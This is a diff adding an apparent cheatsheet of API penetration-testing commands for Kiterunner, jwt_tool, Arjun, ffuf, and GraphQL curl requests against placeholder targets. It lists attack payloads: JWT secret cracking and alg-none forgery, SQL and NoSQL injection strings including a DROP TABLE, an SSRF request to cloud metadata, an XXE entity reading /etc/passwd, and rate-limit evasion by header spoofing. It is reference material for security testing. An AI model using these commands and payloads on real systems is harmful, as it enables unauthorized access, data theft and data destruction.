@@ -1,0 +1,231 @@
+% api-testing, api, rest, graphql
+
+# ============================================================================
+# KITERUNNER - API Endpoint Discovery
+# ============================================================================
+
+# Scan for API endpoints
+kr scan <target_url> -w <wordlist>
+$ target_url: echo -e "https://api.target.com\nhttps://target.com/api"
+$ wordlist: echo -e "/usr/share/wordlists/api-routes.txt\n/opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt"
+
+# Scan with specific HTTP methods
+kr scan <target_url> -w <wordlist> -x <methods>
+$ target_url: echo "https://api.target.com"
+$ wordlist: echo "/usr/share/wordlists/api-routes.txt"
+$ methods: echo -e "GET,POST\nGET,POST,PUT,DELETE"
+
+# Brute force API with parameters
+kr brute <target_url> -w <wordlist>
+$ target_url: echo "https://api.target.com"
+$ wordlist: echo "/usr/share/wordlists/parameters.txt"
+
+# Scan with authentication token
+kr scan <target_url> -w <wordlist> -H "Authorization: Bearer <token>"
+$ target_url: echo "https://api.target.com"
+$ wordlist: echo "/usr/share/wordlists/api-routes.txt"
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+# Output results to file
+kr scan <target_url> -w <wordlist> -o <output_file>
+$ target_url: echo "https://api.target.com"
+$ wordlist: echo "/usr/share/wordlists/api-routes.txt"
+$ output_file: echo "kiterunner-results.txt"
+
+# ============================================================================
+# JWT_TOOL - JWT Manipulation
+# ============================================================================
+
+# Decode JWT token
+jwt_tool <token>
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
+
+# Crack JWT secret (brute force)
+jwt_tool <token> -C -d <wordlist>
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+$ wordlist: echo -e "/usr/share/wordlists/rockyou.txt\n/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+
+# Test for algorithm confusion (change alg to "none")
+jwt_tool <token> -X a
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+# Test for key confusion (RS256 → HS256)
+jwt_tool <token> -X k -pk <public_key_file>
+$ token: echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
+$ public_key_file: echo -e "public.pem\njwks_public.pem"
+
+# Inject new claims into JWT
+jwt_tool <token> -I -pc <claim_name> -pv <claim_value>
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+$ claim_name: echo -e "admin\nrole\nuser_id"
+$ claim_value: echo -e "true\nadministrator\n1"
+
+# Test JWT against target with automated exploits
+jwt_tool <token> -t <target_url> -rh "Authorization: Bearer <token>" -M at
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+$ target_url: echo "https://api.target.com/user/profile"
+
+# Generate new JWT with custom payload
+jwt_tool -S <algorithm> -p <payload> -k <secret>
+$ algorithm: echo -e "hs256\nhs384\nhs512"
+$ payload: echo '{"sub":"1234567890","name":"Admin","admin":true}'
+$ secret: echo "supersecret"
+
+# ============================================================================
+# ARJUN - Parameter Discovery
+# ============================================================================
+
+# Discover hidden GET parameters
+arjun -u <url>
+$ url: echo -e "https://target.com/api/user\nhttps://api.target.com/endpoint"
+
+# Discover POST parameters
+arjun -u <url> -m POST
+$ url: echo "https://target.com/api/login"
+
+# Use custom wordlist
+arjun -u <url> -w <wordlist>
+$ url: echo "https://target.com/api/user"
+$ wordlist: echo -e "/usr/share/wordlists/params.txt\n/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt"
+
+# Scan multiple URLs from file
+arjun -i <urls_file>
+$ urls_file: echo -e "urls.txt\ntargets.txt"
+
+# Set custom headers (authentication)
+arjun -u <url> -H "Authorization: Bearer <token>"
+$ url: echo "https://api.target.com/endpoint"
+$ token: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+# Include specific parameters in requests
+arjun -u <url> --include <params>
+$ url: echo "https://target.com/api/search"
+$ params: echo -e "api_key=12345\nuser_id=1"
+
+# ============================================================================
+# POSTMAN / INSOMNIA - Manual API Testing
+# ============================================================================
+
+# Export Postman collection
+# File → Export → Collection v2.1 → Save as JSON
+
+# Import OpenAPI/Swagger spec into Postman
+# Import → Link/File → Paste Swagger URL or upload swagger.json
+
+# Test API authentication
+# Headers → Add: Authorization: Bearer <token>
+# Or: Authorization: Basic <base64_encoded_creds>
+
+# Test rate limiting
+# Send same request multiple times rapidly
+# Check for 429 Too Many Requests response
+
+# Test IDOR (Insecure Direct Object Reference)
+# Change user_id or object_id parameters
+# Try accessing other users' resources
+
+# ============================================================================
+# GRAPHQL TESTING
+# ============================================================================
+
+# Introspection query (enumerate schema)
+curl -X POST <graphql_endpoint> \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
+$ graphql_endpoint: echo "https://target.com/graphql"
+
+# Query all users (if introspection reveals "users" query)
+curl -X POST <graphql_endpoint> \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ users { id username email } }"}'
+$ graphql_endpoint: echo "https://target.com/graphql"
+
+# Mutation to create/modify data
+curl -X POST <graphql_endpoint> \
+  -H "Content-Type: application/json" \
+  -d '{"query": "mutation { createUser(username: \"attacker\", email: \"attacker@evil.com\") { id } }"}'
+$ graphql_endpoint: echo "https://target.com/graphql"
+
+# GraphQL batching attack (query multiple resources)
+curl -X POST <graphql_endpoint> \
+  -H "Content-Type: application/json" \
+  -d '[{"query": "{ user(id: 1) { email } }"}, {"query": "{ user(id: 2) { email } }"}]'
+$ graphql_endpoint: echo "https://target.com/graphql"
+
+# ============================================================================
+# COMMON API VULNERABILITIES
+# ============================================================================
+
+# IDOR (Insecure Direct Object Reference)
+# GET /api/user/123 → Try /api/user/124, /api/user/1, etc.
+
+# Mass Assignment
+# POST /api/user with {"username": "test", "admin": true}
+
+# Excessive Data Exposure
+# GET /api/users returns sensitive fields (passwords, tokens)
+
+# Lack of Rate Limiting
+# Brute force endpoints without throttling
+
+# Broken Authentication
+# Weak JWT secrets, algorithm confusion, no token expiration
+
+# Injection Flaws
+# SQL injection: /api/search?q='; DROP TABLE users;--
+# NoSQL injection: {"username": {"$ne": null}, "password": {"$ne": null}}
+
+# SSRF (Server-Side Request Forgery)
+# POST /api/fetch with {"url": "http://169.254.169.254/latest/meta-data/"}
+
+# XML External Entity (XXE)
+# If API accepts XML: inject <!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+# ============================================================================
+# FUZZING API ENDPOINTS
+# ============================================================================
+
+# FFUF for API fuzzing
+ffuf -u <base_url>/FUZZ -w <wordlist> -mc 200,201,204
+$ base_url: echo "https://api.target.com/v1"
+$ wordlist: echo "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
+
+# Fuzz with HTTP methods
+ffuf -u <url> -w <wordlist> -X <method>
+$ url: echo "https://api.target.com/endpoint"
+$ wordlist: echo "/usr/share/wordlists/params.txt"
+$ method: echo -e "POST\nPUT\nDELETE\nPATCH"
+
+# Fuzz POST data
+ffuf -u <url> -w <wordlist> -X POST -d "FUZZ=value" -H "Content-Type: application/json"
+$ url: echo "https://api.target.com/login"
+$ wordlist: echo "/usr/share/wordlists/params.txt"
+
+# ============================================================================
+# AUTHENTICATION BYPASS TECHNIQUES
+# ============================================================================
+
+# JWT "none" algorithm
+# Change alg to "none" and remove signature
+
+# SQL injection in login
+# username: admin' OR '1'='1'--
+# password: anything
+
+# GraphQL authentication bypass
+# Query without authentication if introspection is open
+
+# Parameter pollution
+# /api/user?id=1&id=2 (may bypass checks)
+
+# HTTP verb tampering
+# If GET /api/admin blocked, try POST /api/admin
+
+# ============================================================================
+# RATE LIMIT BYPASS
+# ============================================================================
+
+# Rotate IP addresses (use proxies)
+# Change User-Agent headers
+# Add random parameters: ?cache_buster=<random>
+# Use X-Forwarded-For header spoofing
